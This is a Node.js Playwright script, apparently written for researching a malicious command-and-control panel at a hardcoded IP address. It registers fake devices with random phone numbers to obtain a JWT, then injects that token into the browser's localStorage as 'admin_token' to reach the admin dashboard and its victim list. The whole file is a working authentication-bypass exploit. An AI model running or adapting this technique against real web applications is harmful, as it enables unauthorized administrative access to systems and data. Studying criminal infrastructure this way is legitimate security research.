import { request, firefox } from 'playwright';

/**
 * Playwright script – head‑full C2 dashboard login‑bypass.
 *
 * Usage:
 *   node c2_dashboard_access.js <invite_code> [base_url] [phone]
 *   e.g. node c2_dashboard_access.js 7865 http://163.223.146.152
 *
 * If a phone number is not supplied, the script will generate a random
 *   Chinese‑style number ("86138" + 7 random digits). The generated number
 *   fulfills the server's simple length check and can be used for unlimited
 *   registrations.
 *
 * The script performs the following steps:
 *   1️⃣ Register a dummy device on the C2 server using the supplied invite code
 *       (or the default) and the generated phone number.
 *   2️⃣ Retrieve the JWT token returned by the registration endpoint.
 *   3️⃣ Launch a headed Firefox browser and navigate to the dashboard URL.
 *   4️⃣ Store the JWT in localStorage under the key the SPA expects (`admin_token`).
 *   5️⃣ Reload the page – the UI now believes you are authenticated and shows
 *       the full admin dashboard (victim list, stats, etc.).
 */

async function getDeviceToken(baseUrl, inviteCode, phone) {
  const registerUrl = `${baseUrl}/s/qb16jb/l1jrxodp/htxzq8o846`;
  const payload = { phone, invite_code: inviteCode };

  // Playwright's request context (no UI needed) performs the POST.
  const req = await request.newContext();
  const resp = await req.post(registerUrl, {
    data: JSON.stringify(payload),
    headers: { 'Content-Type': 'application/json' }
  });

  const body = await resp.json();
  if (resp.ok() && body.code === 0 && body.data?.token) {
    console.log('✅ Device registration succeeded – JWT obtained');
    return body.data.token;
  }
  console.error('❌ Device registration failed', body);
  process.exit(1);
}

/** Generate a random 11‑digit Chinese phone number.
 *  Prefix "86138" followed by 7 random digits (0‑9).
 */
function randomPhone() {
  const suffix = Math.random().toString().slice(2, 9).padEnd(7, '0');
  return `86138${suffix}`;
}

(async () => {
  // ----- CLI arguments ----------------------------------------------------
  const [, , inviteCode = '7865', baseUrl = 'http://163.223.146.152', phoneArg] = process.argv;
  const phone = phoneArg || randomPhone();

  if (!inviteCode) {
    console.error('Invite code is required');
    process.exit(1);
  }

  console.log(`🛈 Using invite_code="${inviteCode}" phone="${phone}" baseUrl="${baseUrl}"`);

  // ----- 1️⃣ Obtain a fresh JWT ------------------------------------------
  // Allow pre‑fetched token via env var C2_TOKEN (useful when you get it via torsocks curl)
  const jwtToken = process.env.C2_TOKEN || await getDeviceToken(baseUrl, inviteCode, phone);

  // ----- 2️⃣ Launch a headed Firefox instance (longer timeout) ----------
  const browser = await firefox.launch({
    headless: false,
    timeout: 180_000,   // 3 minutes
    slowMo: 100         // optional, slows actions a bit for visibility
  });
  const context = await browser.newContext();
  const page = await context.newPage();

  // ----- 3️⃣ Open the dashboard – origin must be loaded before we can touch localStorage -----
  await page.goto(baseUrl, { waitUntil: 'domcontentloaded' });

  // ----- 4️⃣ Inject the JWT into the key the UI reads -----
  await page.evaluate(([token]) => {
    localStorage.setItem('admin_token', token);
  }, [jwtToken]);

  console.log('🔧 Token injected – reloading UI');

  // ----- 5️⃣ Reload so the UI fetches data with the Bearer token -----
  await page.reload({ waitUntil: 'networkidle' });

  // The dashboard is now fully functional. Keep the window open for manual
  // inspection or extend this script with further Playwright actions.
})();